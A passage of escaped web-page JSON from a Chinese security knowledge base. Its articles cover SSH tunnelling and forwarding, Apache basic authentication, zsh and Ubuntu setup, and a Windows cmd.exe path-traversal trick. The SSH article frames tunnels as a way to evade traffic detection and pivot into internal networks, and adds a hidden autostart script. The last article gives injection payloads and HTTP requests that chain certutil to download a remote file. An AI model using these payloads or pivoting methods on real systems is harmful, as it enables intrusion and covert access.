https://byaaronluo.github.io/知识库/03.主机安全/08.Linux的账号口令机制及其爆破.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/09.SSH建立隧道以及转发.html":{"url":"知识库/03.主机安全/09.SSH建立隧道以及转发.html","title":"09.SSH建立隧道以及转发","keywords":"","body":" 背景 实际问题 SSH 内网代理（穿透） ssh动态转发 问题解决 背景 说到ssh，没有和服务器打交道的人，都只知道ssh是用于远程连接服务器的一个协议吧，我在这里再粘贴一下百度百科： SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行SSH 这篇文章主要是来聊聊ssh隧道及转发 实际问题 事情的起因是因为在做LVS架构加固时，内网某机器需要反向代理另一台公网机器的web服务，该web服务不对外开放，只能本地访问，用户只需要访问内网的web服务，然后建立隧道，从而达到访问外网web服务。 SSH 先抛开上述问题，我们来聊聊ssh ssh 用于登录远程主机, 并且在远程主机上执行命令. 它的目的是替换 rlogin和rsh, 同时在不安全的网络之上, 两个互不信任的主机之间, 提供加密的, 安全的通信连接. X11连接和任意 TCP/IP 端口均可以通过此安全通道转发(forward).当用户通过 连接并登录主机 hostname 后, 根据所用的协议版本, 用户必须通过下述方法之一向远程主机证明他/她的身份 ssh 在建立连接的时候会建立安全隧道，客户端和服务端会建立双向连接，那么在建立双向长连接的过程中是不是可以达到端口转发以及响应的目的呢？（其实VPN技术也可以这样简单理解，客户端与服务端建立了双向长连接，一个正向代理） 我们来看一下ssh的相关参数，（我也忘记从哪里抄来的了） 参数 -a 禁止转发认证代理的连接. -A 允许转发认证代理的连接. 可以在配置文件中对每个主机单独设定这个参数. 代理转发须谨慎. 某些用户能够在远程主机上绕过文件访问权限 (由于代理的 UNIX 域 socket), 他们可以通过转发的连接访问本地代理. 攻击者不可能从代理获得密钥内容, 但是他们能够操作这些密钥, 利用加载到代理上 的身份信息通过认证. -b bind_address 在拥有多个接口或地址别名的机器上, 指定收发接口. -c blowfish|3des|des 选择加密会话的密码术. 3des 是默认算法. 3des (triple-des) 用三支不同的密钥做加密-解密-加密三次运算, 被认为比较可靠. blowfish 是一种快速的分组加密术(block cipher), 非常安全, 而且速度比 3des 快的多. des 仅支持 客户端, 目的是能够和老式的不支持 3des 的协议第一版互操作. 由于其密码算法上的弱点, 强烈建议避免使用. -c cipher_spec 另外, 对于协议第二版, 这里可以指定一组用逗号隔开, 按优先顺序排列的密码术. 详见 Ciphers -e ch|^ch|none 设置 pty 会话的 escape 字符 (默认字符: \"`~'\") . escape 字符只在行首有效, escape 字符后面跟一个点 (\"`.'\" ) 表示结束连接, 跟一个 control-Z 表示挂起连接(suspend), 跟 escape 字符自己 表示输出这个字符. 把这个字符设为 ``none 则禁止 escape 功能, 使会话完全透明. -f 要求 在执行命令前退至后台. 它用于当 准备询问口令或密语, 但是用户希望它在后台进行. 该选项隐含了 -n 选项. 在远端机器上启动 X11 程序的推荐手法就是类似于 ssh -f host xterm 的命令. -g 允许远端主机连接本地转发的端口. -i identity_file 指定一个 RSA 或 DSA 认证所需的身份(私钥)文件. 默认文件是协议第一版的 $HOME/.ssh/identity 以及协议第二版的 $HOME/.ssh/id_rsa 和 $HOME/.ssh/id_dsa 文件. 也可以在配置文件中对每个主机单独指定身份文件. 可以同时使用多个 -i 选项 (也可以在配置文件中指定多个身份文件). -I smartcard_device 指定智能卡(smartcard)设备. 参数是设备文件, 能够用它和智能卡通信, 智能卡里面存储了用户的 RSA 私钥. -k 禁止转发 Kerberos 门票和 AFS 令牌. 可以在配置文件中对每个主机单独设定这个参数. -l login_name 指定登录远程主机的用户. 可以在配置文件中对每个主机单独设定这个参数. -m mac_spec 另外, 对于协议第二版, 这里可以指定一组用逗号隔开, 按优先顺序排列的 MAC(消息验证码)算法 (message authentication code). 详情以 MACs 为关键字查询. -n 把 stdin 重定向到 /dev/null (实际上防止从 stdin 读取数据). 在后台运行时一定会用到这个选项. 它的常用技巧是远程运行 X11 程序. 例如, ssh -n shadows.cs.hut.fi emacs 将会在 shadows.cs.hut.fi 上启动 emacs, 同时自动在加密通道中转发 X11 连接. 在后台运行. (但是如果 要求口令或密语, 这种方式就无法工作; 参见 -f 选项.) -N 不执行远程命令. 用于转发端口. (仅限协议第二版) -o option 可以在这里给出某些选项, 格式和配置文件中的格式一样. 它用来设置那些没有命令行开关的选项. -p port 指定远程主机的端口. 可以在配置文件中对每个主机单独设定这个参数. -q 安静模式. 消除所有的警告和诊断信息. -s 请求远程系统激活一个子系统. 子系统是 SSH2 协议的一个特性, 能够协助 其他应用程序(如 sftp)把SSH用做安全通路. 子系统通过远程命令指定. -t 强制分配伪终端. 可以在远程机器上执行任何全屏幕(screen-based)程序, 所以非常有用, 例如菜单服务. 并联的 -t 选项强制分配终端, 即使 没有本地终端. -T 禁止分配伪终端. -v 冗详模式. 使 打印关于运行情况的调试信息. 在调试连接, 认证和配置问题时非常有用. 并联的 -v 选项能够增加冗详程度. 最多为三个. -x 禁止 X11 转发. -X 允许 X11 转发. 可以在配置文件中对每个主机单独设定这个参数. 应该谨慎使用 X11 转发. 如果用户在远程主机上能够绕过文件访问权限 (根据用户的X授权数据库), 他就可以通过转发的连接访问本地 X11 显示器. 攻击者可以据此采取行动, 如监视键盘输入等. -C 要求进行数据压缩 (包括 stdin, stdout, stderr 以及转发 X11 和 TCP/IP 连接 的数据). 压缩算法和 gzip(1) 的一样, 协议第一版中, 压缩级别 ``level 用 CompressionLevel 选项控制. 压缩技术在 modem 线路或其他慢速连接上很有用, 但是在高速网络上反而 可能降低速度. 可以在配置文件中对每个主机单独设定这个参数. 另见 Compression 选项. -F configfile 指定一个用户级配置文件. 如果在命令行上指定了配置文件, 系统级配置文件 (/etc/ssh/ssh_config ) 将被忽略. 默认的用户级配置文件是 $HOME/.ssh/config -L port:host:hostport 将本地机(客户机)的某个端口转发到远端指定机器的指定端口. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 同时远程主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有 root 才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport -R port:host:hostport 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. 工作原理是这样的, 远程主机上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转向出去, 同时本地主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有用 root 登录远程主机 才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport -D port 指定一个本地机器动态的应用程序端口转发. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接. 目前支持 SOCKS4 协议, 将充当 SOCKS4 服务器. 只有 root 才能转发特权端口. 可以在配置文件中指定动态端口的转发. -1 强制 只使用协议第一版. -2 强制 只使用协议第二版. -4 强制 只使用 IPv4 地址. -6 强制 只使用 IPv6 地址. 其实建立隧道，端口转发只需要以下参数 -f 后台执行ssh指令 -C 允许压缩数据 -N 不执行远程指令 -R 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口 -L 本地端口转发 -D 动态端口转发 例如：下面的命令，-fCNR 指的是 后台执行shell，并要求数据压缩，并不执行远程命令，将远程服务器的1997端口的流量通过隧道转发到本地的22号端口，-o 参数中的ServerAliveInterval是防止连接不稳定，设置每60秒发送一次数据包 ssh -o ServerAliveInterval=60 -fCNR 47.103.xx.xx:1997:localhost:22 tommy@47.103.xx.xx -p 2892 ssh有一个机制，ssh建立隧道只能在本机的环回地址127.0.0.1上，我们只能登录VPS使用ssh指定port登录内网服务器 内网代理（穿透） 刚刚看了上面的例子，我们可以将远程服务器的端口流量转发到内网服务器的端口上，（remote:1997 => localhost:22）,从而可以从vps上访问内网地址。 使用ssh实现内网穿透有什么好处吗？ SSH 是专为远程登录会话和其他网络服务提供安全性的协议，利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题，白话就是说，ssh的流量有层加密，一般在内网穿透的时候frp,lcx, NatByPass等工具都有明显的特征，在Linux上使用ssh不但可轻松绕过流量检测设备，也可以提供稳定的连接，但是缺点就是很容易暴露，不适合留做后门。 刚刚说了，ssh建立隧道只能在本机的环回地址127.0.0.1上，那么我们一定要登录自己的vps然后才访问吗？答案并不是这样，解决这个问题理论上需要开启一个对外可访问的端口，将该端口的流量转发到sshd的端口 那么使用iptables，firewalld可以吗？答案是不行，iptables，firewalld做转发是不能转发到本地环回地址，因为这是不安全的，如果需要强行修改，需要修改内核 # 根据实际情况修改 sysctl -w net.ipv4.conf.eth0.route_localnet=1 但是这里并不建议修改内核参数，因为修改之后就违背了Linux的安全机制，当时间久远或者服务器交接之后可能就忘了这个安全项，所以需要选用一个安全可靠的方法 这里我们使用ssh 的-L参数，将本地机(客户机)的某个端口转发到本地机器的指定端口（正向代理） 例如下面的命令，对外开放2017端口，并将2017端口的流量转发到1997端口 ssh -o ServerAliveInterval=60 -fCNL *:2017:localhost:1997 localhost -p 2892 现在流程是 remote:2017 => remote_localhost:1997 => localhost:22，在任意一台机器上，访问vps的2017端口，就会将流量先转发到1997端口，然后通过ssh隧道将流量反向转发到内网的kali上，如下图所示 ssh动态转发 SSH动态转发是 ssh 创建一个 socks v5 的服务并在 bind_address:bind_port 上侦听，当收到数据后，解析出需要连接的主机和端口并通道加密通道发送给 sshd，sshd 转发数据后并返回结果数据。 SSH动态转发就是SSH服务器使用的是正向匿名代理的作用，由内部机器将数据包通过socks发送到绑定端口，再通过sshd服务去请求目标服务。 ssh的动态转发在流量侧是加密流量，非常适用于外网拿下一台具有访问内网的机器之后，进行代理，攻击内网机器（前提是控制住一台Linux主机） 在linux中，通常使用如下命令，后台执行，再通过proxychains等工具直接代理到内网机器 nohup ssh -ND 1080 [username]@[ip] -p [port] & 在windows中，一般使用如下命令，后台执行 start /b ssh -ND 1080 [username]@[ip] -p [port] 但是在windows 中，只要关闭了cmd.exe ，就会关闭该进程，如果将其写入到.bat文件中，那么就会有非常丑陋的dos框 所以我的做法是写一个vbs，开机自启动bat文件 run.bat内容如下 start /b ssh -ND 1080 [username]@[ip] -p [port] run.vbs如下 Dim WinScriptHost Set WinScriptHost = CreateObject(\"WScript.Shell\") WinScriptHost.Run Chr(34) & \"\" & Chr(34), 0 Set WinScriptHost = Nothing 开机启动项的位置在，打开cmd.exe ，运行shell:startup 我在我的vps上启动一个web服务，前三个http请求就是我通过代理去访问的web服务，后三个http请求不是通过代理，可以看到，动态转发就是实现了一个匿名正向代理的一个过程 学会ssh动态转发，其实也就不用配置什么ss了，我相信你已经懂了 问题解决 回到最开始的问题，我们首先需要配置nginx反向代理，这里配置项就不贴出来，就是在内网开放web服务 然后将本地的端口流量转发到远程端口处（-L参数喔） 我在这里使用autossh, autossh的参数与ssh的参数是一致的，但是不同的是，在隧道断开的时候，autossh会自动重新连接而ssh不会（ssh需要配置-o 参数的 ServerAliveInterval，ServerAliveInterval可以保证每隔多长时间重新连接一次）。另外不同的是我们需要指出的-M参数，这个参数指定一个端口是远程主机用来接收内网机器的信息，如果隧道不正常而返回给内网机器让他实现重新连接。 使用M参数，监听本地端口，当ssh超时则自动重新连接 autossh -M 14431 -fCNL *:4431:192.168.0.18:8443 admin@xxx.xxx.xxx.xxx 使用autossh的好处有如下几点： autossh相当于一个守护进程，当ssh连接失效时，autossh 进程则会重新拉起ssh隧道，就不需要定时重连，这样的shell会更稳定 当出现断网的时候，如果使用ssh -o ServerAliveInterval 定时重连，则会失效 ps：使用autossh 需要将自己的公钥写入authorized_keys中 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:24:21 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/09.SSH建立隧道以及转发.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/10.如何在Ubuntu16.04上使用Apache设置密码身份验证.html":{"url":"知识库/03.主机安全/10.如何在Ubuntu16.04上使用Apache设置密码身份验证.html","title":"10.如何在Ubuntu16.04上使用Apache设置密码身份验证","keywords":"","body":" 介绍 先决条件 第1步 - 安装Apache Utilities包 第2步 - 创建密码文件 第3步 - 配置Apache密码身份验证 选项1：在虚拟主机定义中配置访问控制（首选） 选项2：使用.htaccess文件配置访问控制 第4步 - 确认密码验证 https://cloud.tencent.com/developer/article/1358394 介绍 在运行网站时，网站的某些部分通常会限制访问者。Web应用程序可以提供自己的身份验证和授权方法，但如果Web服务器不足或不可用，也可以使用Web服务器本身来限制访问。 在本指南中，我们将演示如何在Ubuntu 16.04上运行的Apache Web服务器上对资产进行密码保护。 先决条件 要完成本教程，您需要访问Ubuntu 16.04服务器。 此外，在开始之前，您将需要以下内容： 一个服务器上的sudo用户：您可以创建一个具有sudo权限用户按照的Ubuntu 16.04服务器初始设置指南进行设置，没有服务器的同学可以在这里购买，不过我个人更推荐您使用免费的腾讯云开发者实验室进行试验，学会安装后再购买服务器。 Apache2 Web服务器。 使用SSL保护的网站 ：如何设置该网站取决于您是否拥有网站的域名。 如果你有域名，保护你网站的最简单方法是使用腾讯云SSL证书服务，它提供免费的可信证书。腾讯云SSL证书安装操作指南进行设置。 如果你没有域名，建议您先去这里注册一个域名，如果你只是使用此配置进行测试或个人使用，则可以使用自签名证书，不需要购买域名。自签名证书提供了相同类型的加密，但没有域名验证公告。关于自签名证书，你可以参考为Apache创建自签名SSL证书和如何为Nginx创建自签名SSL证书这两篇文章。 当所有这些都到位后，以sudo用户身份登录您的服务器并继续下面。 第1步 - 安装Apache Utilities包 我们将使用名为apache2-utils包的一部分的实用程序htpasswd来创建文件并管理访问受限内容所需的用户名和密码。 sudo apt-get update sudo apt-get install apache2-utils 第2步 - 创建密码文件 我们现在可以访问该htpasswd命令。我们可以使用它来创建Apache可用于验证用户身份的密码文件。我们将在/etc/apache2配置目录中为此目的创建一个名为.htpasswd的隐藏文件。 我们第一次使用此实用程序时，需要添加-c选项以创建指定的文件。我们在命令末尾指定用户名（在此示例中为sammy）以在文件中创建新条目： sudo htpasswd -c /etc/apache2/.htpasswd sammy 系统将要求您提供并确认用户的密码。 省略您要添加的任何其他用户的-c参数： sudo htpasswd /etc/apache2/.htpasswd another_user 如果我们查看文件的内容，我们可以看到每条记录的用户名和加密密码： cat /etc/apache2/.htpasswd sammy:$apr1$.0CAabqX$rb8lueIORA/p8UzGPYtGs/ another_user:$apr1$fqH7UG8a$SrUxurp/Atfq6j7GL/VEC1 第3步 - 配置Apache密码身份验证 现在我们有一个文件，其中包含Apache可以读取的格式的用户和密码，我们需要配置Apache以在提供受保护内容之前检查此文件。我们可以通过以下两种方式之一完成此操作：直接在站点的虚拟主机文件中，或者将.htaccess文件放在需要限制的目录中。通常最好使用虚拟主机文件，但如果您需要允许非root用户管理自己的访问限制，请检查网站旁边的版本控制限制，或者使用.htaccess文件的Web应用程序已用于其他目的，看看第二个选项。 选择最适合您需求的选项。 选项1：在虚拟主机定义中配置访问控制（首选） 第一个选项是编辑Apache配置并将密码保护添加到虚拟主机文件。这通常会提供更好的性能，因为它避免了读取分布式配置文件的费用。此选项需要访问配置，该配置并非始终可用，但是当您确实有访问权限时，建议您访问。 首先打开要添加限制的虚拟主机文件。对于我们的示例，我们将使用包含通过Ubuntu的apache包安装的默认虚拟主机的000-default.conf文件： sudo nano /etc/apache2/sites-enabled/000-default.conf 在内部，删除了注释，文件看起来应该类似于： ServerAdmin webmaster@localhost DocumentRoot /var/www/html ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined 身份验证基于每个目录完成。要设置身份验证，您需要使用块来定位要限制的目录。在我们的示例中，我们将限制整个文档根目录，但您可以修改此列表以仅定位Web空间中的特定目录： ServerAdmin webmaster@localhost DocumentRoot /var/www/html ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined 在此目录块中，指定我们希望设置Basic身份验证。对于AuthName，请选择在提示输入凭据时将显示给用户的领域名称。使用该AuthUserFile指令将Apache指向我们创建的密码文件。最后，我们将要求valid-user访问此资源，这意味着任何可以使用密码验证其身份的人都将被允许： ServerAdmin webmaster@localhost DocumentRoot /var/www/html ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined AuthType Basic AuthName \"Restricted Content\" AuthUserFile /etc/apache2/.htpasswd Require valid-user 完成后保存并关闭文件。 在重新启动Web服务器之前，可以使用以下命令检查配置： sudo apache2ctl configtest 如果所有内容都已检出并获得Syntax OK，请重新启动服务器以实施密码策略。由于systemctl不显示所有服务管理命令的结果，我们将使用status以确保服务器正在运行： sudo systemctl restart apache2 sudo systemctl status apache2 现在，您指定的目录现在应该受密码保护。 选项2：使用.htaccess文件配置访问控制 Apache可以使用.htaccess文件以允许在内容目录中设置某些配置项。由于Apache必须在涉及目录的每个请求上重新读取这些文件，这会对性能产生负面影响，因此首选选项1，但如果您已经在使用.htaccess文件或需要允许非root用户管理限制，那么.htaccess文件合理。 要使用.htaccess文件启用密码保护，请打开主Apache配置文件： sudo nano /etc/apache2/apache2.conf 找到包含/var/www文档根目录的块。.htaccess通过将该块中的AllowOverride指令从“None”更改为“All”来打开处理： . . . Options Indexes FollowSymLinks AllowOverride All Require all granted . . . 完成后保存并关闭文件。 接下来，我们需要将.htaccess文件添加到我们希望限制的目录中。在我们的演示中，我们将限制基于/var/www/html的整个文档根目录（整个网站），但您可以将此文件放在您希望限制访问的任何目录中： sudo nano /var/www/html/.htaccess 在此文件中，指定我们希望设置Basic身份验证。对于AuthName，请选择在提示输入凭据时将显示给用户的领域名称。使用该AuthUserFile指令将Apache指向我们创建的密码文件。最后，我们将要求valid-user访问此资源，这意味着任何可以使用密码验证其身份的人都将被允许： AuthType Basic AuthName \"Restricted Content\" AuthUserFile /etc/apache2/.htpasswd Require valid-user 保存并关闭文件。重新启动Web服务器以使用该.htaccess文件密码保护目录中或目录下的所有内容，并使用systemctl status以验证重新启动是否成功： sudo systemctl restart apache2 sudo systemctl status apache2 第4步 - 确认密码验证 要确认您的内容受到保护，请尝试在网络浏览器中访问受限制的内容。您应该看到一个用户名和密码提示符，如下所示： 如果输入正确的凭据，则可以访问该内容。如果输入错误的凭据或点击“取消”，您将看到“未授权”错误页面： Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:24:22 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/10.如何在Ubuntu16.04上使用Apache设置密码身份验证.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/11.Ubuntu科学上网.html":{"url":"知识库/03.主机安全/11.Ubuntu科学上网.html","title":"11.Ubuntu科学上网","keywords":"","body":" QV2ray 下载及安装 QV2ray 使用 Qt 框架的跨平台 V2Ray 客户端。支持 Windows, Linux, macOS；插件系统支持 SSR / Trojan / Trojan-Go / NaiveProxy 下载及安装 https://github.com/Qv2ray/Qv2ray/releases 下载最新版，由于我搭建的环境vless协议，所以需要支持最新版的客户端以及v2ray内核 下载最新版v2ray-core https://github.com/v2fly/v2ray-core/releases 下载好之后，需要在Qv2ray 中配置 v2ray-core，如下图所示 第一个路径为v2ray-core中的二进制文件 第二个路径为v2ray-core的路径 然后点击check V2ray Core Setting，出现如下所示表示配置成功 然后开启开机启动即可 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:24:08 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/11.Ubuntu科学上网.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/12.Ubuntu配置zsh.html":{"url":"知识库/03.主机安全/12.Ubuntu配置zsh.html","title":"12.Ubuntu配置zsh","keywords":"","body":" zsh介绍 安装 下载zsh 配置 安装插件 修改配置文件 主题配置 终端 root用户使用zsh 权限问题 zsh介绍 zsh是一个Linux下强大的shell, 由于大多数Linux产品安装以及默认使用bash shell, 但是丝毫不影响极客们对zsh的热衷, 几乎每一款Linux产品都包含有zsh，通常可以用apt、urpmi或yum等包管理器进行安装. zsh是bash的增强版，其实zsh和bash是两个不同的概念，zsh更加强大。 通常zsh配置起来非常麻烦，且相当的复杂，所以oh-my-zsh是为了简化zsh的配置而开发的，因此oh-my-zsh算是zsh的配置. 安装 # 首先查看系统使用的shell echo $SHELL # 查看当前系统支持的所有的shell cat /etc/shells 下载zsh sudo apt install zsh 设置zsh为默认shell chsh -s /bin/zsh reboot touch ~/.zshrc 下载oh-my-zsh sh -c \"$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\" 下载完成之后，就会出现如下图所示的界面 cd ~/.oh-my-zsh/custom/plugins/ 接下来就是配置以及git相关的东西了 配置 安装插件 cd ~/.oh-my-zsh/custom/plugins/ git clone https://github.com/zsh-users/zsh-autosuggestions git clone https://github.com/zsh-users/zsh-syntax-highlighting.git 修改配置文件 vim ~/.zshrc plugins=( git zsh-autosuggestions zsh-syntax-highlighting ) 在~/.zshrc文末添加 source ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh 主题配置 由于一直玩鸟，所以我选择的shell主题是parrot的shell主题 vim ~/.zhsrc 修改主题为gnzh 使用 https://gist.github.com/Ares-X/52fe7faf9dda8b943c1a7f18654a2dbb#file-gnzh-zsh-theme 替换~/.oh-my-zsh/themes 下的 gnzh.zsh-theme source ~/.zshrc 终端 我使用了很多终端工具，最终确定还是比较喜欢Tilix sudo apt install tilix 修改默认终端 sudo update-alternatives --config x-terminal-emulator 在文件系统中配置open Tilix 我们配置完默认终端之后，在文件系统中右键点击 open terminal 发现并不是我们设置的默认终端 sudo apt-get install nautilus-actions /usr/bin/tilix --working-directory=%d/%b 保存之后，执行如下 nautilus -q root用户使用zsh 权限问题 # 复制相关文件到家目录即可 # 在.zshrc第一行添加 ZSH_DISABLE_COMPFIX=true Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:23:41 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/12.Ubuntu配置zsh.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/13.Ubuntu如何正确换源.html":{"url":"知识库/03.主机安全/13.Ubuntu如何正确换源.html","title":"13.Ubuntu如何正确换源","keywords":"","body":" 背景 Ubuntu代号 换源 更新缓存、升级 背景 换源很简单，修改/etc/apt/sources.list将提供的阿里源，清华源复制上去就欧克了，但是在更新源，以及更新软件的时候就会发现为什么换了源之后还是和之前国外源一样很慢很慢。 Ubuntu代号 Ubuntu各个版本都有代号，比如 4.10 Warty Warthog(长疣的疣猪) 5.04 Hoary Hedgehog(灰白的刺猬) 5.10 Breezy Badger(活泼的獾) 6.06(LTS) Dapper Drake(整洁的公鸭) 6.10 Edgy Eft(急躁的水蜥) 7.04 Feisty Fawn(坏脾气的小鹿) 7.10 Gutsy Gibbon(勇敢的长臂猿) 8.04(LTS) Hardy Heron(耐寒的苍鹭) 8.10 Intrepid Ibex (勇敢的野山羊) 9.04 Jaunty Jackalope(得意洋洋的怀俄明野兔) 9.10 Karmic Koala(幸运的考拉) 10.04(LTS) Lucid Lynx(清醒的猞猁) 10.10 Oneiric Ocelot(梦幻的豹猫) 11.04 Natty Narwhal(敏捷的独角鲸) 11.10 Oneiric Ocelot（有梦的虎猫） 12.04(LTS) Precise Pangolin(精准的穿山甲) 12.10 Quantal Quetzal(量子的绿咬鹃) 13.04 Raring Ringtail(铆足了劲的猫熊) 13.10 Saucy Salamander(活泼的蝾螈) 14.04(LTS) Trusty Tahr (可靠的塔尔羊)(LTS) 14.10 Utopic Unicorn(乌托邦独角兽) 15.04 Vivid Vervet (活泼的小猴) 15.10 Wily Werewolf (狡猾的狼人) 16.04(LTS) Xenial Xerus (好客的非洲地松鼠) 16.10 Yakkety Yak（牦牛） 17.04 Zesty Zapus(开心的跳鼠) 17.10 Artful Aardvark(机灵的土豚) 18.04(LTS) Bionic Beaver（仿生海狸） 18.10 Cosmic Cuttlefish（宇宙墨鱼） 19.04 Disco Dingo（舞动的灵犬） 19.10 Eoan Ermine（白貂） 20.04(LTS) Focal Fossa（专注的马达加斯加长尾狸猫） ... 再此同时，你要知道如何查看Ubuntu的代号 lsb_release -a 换源 去阿里源官网去查看是否有此代号的源，http://mirrors.aliyun.com/ubuntu/dists/ 可以看到，现在已经有了ubuntu 20.04(代号focal)的源了 在换源过程中，以此为模板，将下面的TODO换成你的CodeName deb http://mirrors.aliyun.com/ubuntu/ TODO main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ TODO main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ TODO-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ TODO-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ TODO-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ TODO-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ TODO-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ TODO-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ TODO-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ TODO-backports main restricted universe multiverse 我的codename是focal，那么我的源就为如下所示： deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse 更新缓存、升级 apt update apt upgrade Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:24:23 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/13.Ubuntu如何正确换源.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/14.Windows_CMD.exe执行任意代码、命令、程序的漏洞.html":{"url":"知识库/03.主机安全/14.Windows_CMD.exe执行任意代码、命令、程序的漏洞.html","title":"14.Windows_CMD.exe执行任意代码、命令、程序的漏洞","keywords":"","body":" 利用方式 可能的使用场景 一些基于windows 系统的设备 web管理页面 远程下载文件 利用方式 cmd.exe /c \"ping 127.0.0.1/../../../../../../../../../../../../../windows/system32/calc.exe\" 当然也不知ping命令还有一些也可以，例如下列 cmd.exe /c \"whoami 127.0.0.1/../../../../../../../../../../../../../../../windows/system32/calc.exe\" cmd.exe /c \"nslookup 127.0.0.1/../../../../../../../../../../../../../../../windows/system32/calc.exe\" 可能的使用场景 一些基于windows 系统的设备 web管理页面 我们经常遇到一些基于Windows系统的设备，在其管理页面上具备ping功能，其目的是为了进行连通性测试或者资产发现等等。当然一些网站可能也有类似的功能。由于开发者安全意识的提高，以及SDL的推广落地，直接进行OS Command Injection的可能性非常低。利用这个方法解和上传漏洞（如果存在的话可以执行任何代码） windows 客户端测试不通过，在windows server 2012 测试如下 POST /ping.php HTTP/1.1 Host: 192.168.93.143 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 70 ipaddress=127.0.0.1/../../../../../../../windows/system32/ipconfig.exe 远程下载文件 这个比较鸡肋，由于路径穿越执行命令是无法带参数，带参数就会报错 但是在第第一个命令后带上&，两个命令一起执行，那么就能执行成功后面的命令 在这里将上面代码的escapeshellcmd函数去掉，添加%26，执行文件下载的命令 POST /ping.php HTTP/1.1 Host: 192.168.93.143 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 146 ipaddress=127.0.0.1/../../../../../../../windows/system32/calc%26certutil.exe /urlcache /split /f http://192.168.200.76:8080/test.txt C:\\\\test.txt 